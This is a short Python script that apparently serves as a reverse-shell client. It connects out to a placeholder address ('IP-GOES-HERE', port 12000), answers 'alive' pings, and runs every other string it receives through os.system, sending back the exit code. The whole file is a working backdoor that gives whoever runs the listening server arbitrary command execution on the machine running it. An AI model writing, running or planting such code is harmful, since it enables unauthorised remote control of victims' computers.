import os
import socket
import threading
s = socket.socket()
s.connect(('IP-GOES-HERE', 12000))

def running():
    data = s.recv(1024)
    data = data.decode("utf-8")

    if data == "alive":
        s.send(bytes(f">: Yes, Im alive".encode("utf-8")))
    else:
        returned = os.system(f"{data}")
        s.send(bytes(f">: {returned}".encode("utf-8")))
    running()

running()
